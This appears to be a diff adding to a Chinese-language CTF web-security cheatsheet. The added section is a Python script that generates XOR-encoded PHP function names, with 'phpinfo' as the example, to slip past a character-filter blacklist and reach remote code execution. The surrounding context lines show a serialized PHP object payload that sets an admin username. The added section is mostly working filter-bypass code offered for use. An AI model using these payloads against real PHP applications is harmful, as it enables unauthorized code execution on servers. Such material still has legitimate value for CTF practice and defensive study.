@@ -196,3 +196,26 @@ O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
 ## 函数名取反绕过
 
 ## data://协议
+
+## 利用字符串函数名执行特性rce
+
+```python
+payload="phpinfo"
+allowed="ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~!#%*+-/:;<=>?@"# no ()
+reth=""
+rett=""
+for c in payload:
+    flag=False
+    for i in allowed:
+        if flag == False:
+            for j in allowed:
+                if ord(i)^ord(j)==ord(c):
+                    #print("i=%s j=%s c=%s"%(i,j,c))
+                    reth=reth+"%"+str(hex(ord(i)))[2:]
+                    rett=rett+"%"+str(hex(ord(j)))[2:]
+                    flag=True
+                    break
+ret=reth+"^"+rett
+
+print ret
+```
